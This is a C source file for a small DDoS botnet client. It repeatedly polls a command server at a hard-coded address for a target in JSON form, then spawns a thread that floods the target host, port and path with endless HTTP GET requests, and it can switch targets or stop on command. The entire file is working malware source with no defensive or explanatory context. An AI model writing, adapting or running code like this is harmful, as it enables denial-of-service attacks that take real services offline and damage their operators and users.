#include "extclib/net.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <threads.h>

#define BUFSIZ_1K (1 << 10)
#define BUFSIZ_2K (2 << 10)
#define BUFSIZ_8K (8 << 10)

#define ADDRESS "127.0.0.1", 8080

static void run_ddos(void *target);
static void _stop_thrd(thrd_t *th);

static char *_strncpy(char *output, const char *input, size_t size);

static int stop_ddos = 0;
static int thrd_used = 0;

int main(void) {
	char currtarg[BUFSIZ_2K] = "NULL";
	char newtarg[BUFSIZ_2K];
	char buffer[BUFSIZ_8K];

	net_conn *conn;
	thrd_t th;
	char *ptr;
	int ret;

	char inputs[BUFSIZ_1K];
	sprintf(inputs, "{\"return\":%%d,\"result\":\"%%%d[^\"]\"}", BUFSIZ_2K-1);

	while(1) {
		conn = net_connect(ADDRESS);
		if (conn == NULL) {
			sleep(5);
			continue;
		}

		net_http_get(conn, "/cmd");
		ret = net_recv(conn, buffer, BUFSIZ_8K-1);
		buffer[ret] = '\0';

		net_close(conn);

		ptr = strstr(buffer, "{");
		if (ptr == NULL) {
			continue;
		}

		ret = -1;
		sscanf(ptr, inputs, &ret, newtarg);
		if (ret != 0) {
			continue;
		}

		if (strcmp(newtarg, currtarg) == 0) {
			continue;
		}

		if (strcmp(newtarg, "NULL") == 0) {
			_strncpy(currtarg, newtarg, BUFSIZ_2K);
			_stop_thrd(&th);
			continue;
		}

		_strncpy(currtarg, newtarg, BUFSIZ_2K);
		_stop_thrd(&th);

		thrd_create(&th, (thrd_start_t)run_ddos, currtarg);
	}
	
	return 0;
}

static void run_ddos(void *target) {
	char buffer[BUFSIZ_2K];
	char addr[BUFSIZ_2K];
	char *path = NULL;
	int port = 0;
	size_t len;
	net_conn *conn;

	_strncpy(addr, (const char *)target, BUFSIZ_2K);
	len = strlen(addr);

	for (size_t i = 0, j = 0; i < len; ++i) {
		if (addr[i] == ':') {
			addr[i] = '\0';
			j = i + 1;
			continue;
		}
		if (addr[i] == '/') {
			addr[i] = '\0';
			port = atoi(addr + j);
			addr[i] = '/';
			path = (addr + i);
			break;
		}
	}

	if (port == 0) {
		return;
	}

	thrd_used = 1;

	while(1) {
		if (stop_ddos) {
			break;
		}
		conn = net_connect(addr, port);
		if (conn == NULL) {
			sleep(5);
			continue;
		}
		net_http_get(conn, path);
		net_recv(conn, buffer, BUFSIZ_2K);
		net_close(conn);
	}

	thrd_used = 0;
}

static void _stop_thrd(thrd_t *th) {
	if (thrd_used) {
		stop_ddos = 1;
		thrd_join(*th, NULL);
		stop_ddos = 0;
	}
}

static char *_strncpy(char *output, const char *input, size_t size) {
	char *ret = strncpy(output, input, size-1);
	output[size-1] = '\0';
	return ret;
}
